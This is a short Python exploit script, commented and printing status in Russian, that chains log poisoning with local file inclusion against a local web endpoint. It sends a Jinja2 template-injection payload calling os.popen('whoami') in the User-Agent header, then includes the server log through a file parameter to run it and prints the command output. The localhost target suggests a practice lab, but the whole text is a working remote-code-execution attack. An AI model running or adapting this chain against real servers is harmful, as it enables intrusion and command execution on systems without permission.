import requests

TARGET_URL = "http://127.0.0.1:5000/advanced-lfi"

print("[*] Запуск автоматического эксплойта...")

payload = "{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}"

headers = {
    "User-Agent": payload  
}

print("[*] Этап 1: Отправляем вредоносный User-Agent в лог-файл сервера...")
requests.get(f"{TARGET_URL}?file=server_access.log", headers=headers)
print("[*] Этап 2: Активируем уязвимость LFI для выполнения нашего кода...")
response = requests.get(f"{TARGET_URL}?file=server_access.log")

print("\n[+] ОТВЕТ ОТ СЕРВЕРА (Результат выполнения команды):")
print("-" * 40)


if "LOG:" in response.text:
    lines = response.text.split('\n')
    for line in lines:
        if "LOG:" not in line and line.strip():
            print(f"Выполнено на сервере: {line.strip()}")
            
print("-" * 40)
print("[+] Атака успешно завершена!")
